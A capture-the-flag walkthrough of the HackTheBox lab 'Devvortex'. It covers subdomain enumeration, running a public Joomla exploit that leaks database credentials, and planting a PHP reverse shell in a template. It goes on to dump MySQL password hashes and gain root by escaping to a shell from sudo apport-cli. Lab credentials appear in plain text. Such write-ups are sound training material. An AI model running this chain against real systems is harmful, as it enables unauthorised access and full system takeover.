![](https://i.imgur.com/FGhMuy7.png)

# Initial Enumeration 

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sCV 10.10.11.242 -T5

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.75 seconds
```


![](https://i.imgur.com/PoafhCH.png)

![](https://i.imgur.com/WPZsW9U.png)


```bash
ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -fw 5338 | grep --color=auto 200
```
![](https://i.imgur.com/yZIes2W.png)

![](https://i.imgur.com/IMRWJTc.png)


![](https://i.imgur.com/Wd4ZOhC.png)


```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://dev.devvortex.htb/
```

![](https://i.imgur.com/mPPlFPz.png)

![](https://i.imgur.com/4ZUiK2l.png)

![](https://i.imgur.com/IyKuaVy.png)

 I learned that there is a great tool for enumerating Joomla named “droopscan.” So I downloaded the tool onto my attack machine and fired it at the target.
 
```
git clone https://github.com/droope/droopescan.git
cd droopescan
pip install -r requirements.txt
./droopescan scan joomla --url http://dev.devvortex.htb/
```

![](https://i.imgur.com/KSsLhKc.png)

![](https://i.imgur.com/DLW4pT9.png)

upon searching for exploit i found a useful GitHub repo for an exploit written in ruby
![](https://i.imgur.com/B6u3XCf.png)

after downloading the exploit i install needed requirements and run the exploit and found a user and password

```rb
gem install httpx docopt paint
ruby exploit.rb http://dev.devvortex.htb
```

![](https://i.imgur.com/9vQyS2y.png)

```
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
```

luckyly the creds works for the `joomla` admin login page

![](https://i.imgur.com/ukD8bZa.png)

 going to the template page and checking the `error.php` file i fill i should be able to get a reverse shell connection to myself
 
 ![](https://i.imgur.com/Um8F3A2.png)
 
i edited to code by adding my own malicious payload to get a reverse shell (pentestmonkey's php RCE payload)

![](https://i.imgur.com/pS5Innh.png)

then i start up my listener then visit the direct URL to the error.php file of the edited template to triger the code and get a shell

![](https://i.imgur.com/v7LXlsK.png)

but the user i got a shell as isn't privilege enough to get the first flag

![](https://i.imgur.com/6CzCXob.png)

from the ruby exploit earlier i noticed the credentials is for a mysql server

![](https://i.imgur.com/jefSmyk.png)

so i decide to connect to it with the creds

```
mysql -ulewis -pP4ntherg0t1n5r3c0n##
show Tables;
use joomla;
SELECT * FROM sd4fg_users;
```

i found logans hash

![](https://i.imgur.com/453MUIX.png)

i search for the hash type

![](https://i.imgur.com/WS9nYnC.png)

![](https://i.imgur.com/PrwVg0r.png)

i used the logan creds against the open ssh port and found the user flag

![](https://i.imgur.com/wYUAr5W.png)

# privilege escalation
![](https://i.imgur.com/2yqNlfe.png)

### About this binary
A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege. It is extremely unlikely that a system administrator would configure sudo to allow unprivileged users to perform this class of exploit.


![](https://i.imgur.com/AmqZJK9.png)

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue...  
..dpkg-query: no packages found matching xorg
...........

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
```

after typing the letter `v` a vim editing interface will showup and here is fun part 
because we are able to run the binary as root (`sudo`) and there is a command interaction section i vim so running `!/bin/bash` will spawn a `root` shell

![](https://i.imgur.com/BVQstCu.png)

click enter and find root flag

![](https://i.imgur.com/3SnAu0v.png)
